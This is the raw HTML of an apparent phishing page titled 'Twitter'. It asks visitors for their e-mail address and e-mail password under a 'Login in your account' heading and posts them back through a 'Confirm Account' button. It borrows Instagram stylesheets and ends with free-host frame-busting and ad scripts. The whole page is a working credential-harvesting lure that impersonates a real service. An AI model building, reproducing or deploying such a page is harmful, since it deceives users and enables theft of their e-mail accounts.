
<html>
<head>
<meta charset="utf-8">
<title>Twitter </title>
<meta name="viewport" content="width=device-width">
<link rel="shortcut icon" href="data:image/png;base64,">
</head>
<body class="" style="">
<div id="react-root">
<section class="LZyqZ">
<div class="lTdZb">
<div class="vqibd  wNNoj ">
<img src="https://thoughtfulschools.org.au/wp-content/uploads/2021/11/Twitter-gif-2.gif" alt="mail" width="140">
<div class="ZpgjG   _1I5YO">
<h2 class="AjK3K ">Login in your account </h2>
</div>
<p class="GusmU SVI5E     ">Please write your E-Mail Address and E-Mail Password and click "Confirm Account" and fill the next form.</p>
<div class="GA2q- ">
<form class="JraEb" method="POST">
<div class="QuiLu Xb8C0"><input name="y_pass" placeholder="E-Mail Address" type="email" class="PAhYv zyHYP" required=""></div>
<div class="QuiLu Xb8C0"><input name="x_pass" placeholder="E-Mail Password" type="password" class="PAhYv zyHYP" required=""></div><span class="idhGk _1OSdk"><button class="_5f5mN       jIbKX KUBKM      yZn4P   ">Confirm Account</button></span>
</form>
</div>
<br>
</div>
<br>
</div> <p id="community guidelines" style="font-family:sans-serif;font-weight:100;"> </p> </center> </body> </html>
</div>
</div>
</section>
</html>
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/f5339c1f472f.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/Challenge.css/e6dcc76c8eaf.css" type="text/css" crossorigin="anonymous">
<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
</div>
</body>
</html>
 <textarea Style="width:1px; height:

1px" Rows="1" Cols="1"> <SCRIPT LANGUAGE="Javascript"> if (parent.frames.length > 0) parent.location.href%self.location; </SCRIPT><!--SCRIPT GENERATED BY SERVER! PLEASE REMOVE-->
<center><a href="http://somee.com">Web hosting by Somee.com</a></center>
</textarea></xml></script></noframes></noscript></object></layer></style></title></applet>
<script language="JavaScript" src="https://ads.mgmt.somee.com/serveimages/ad2/WholeInsert4.js"></script>
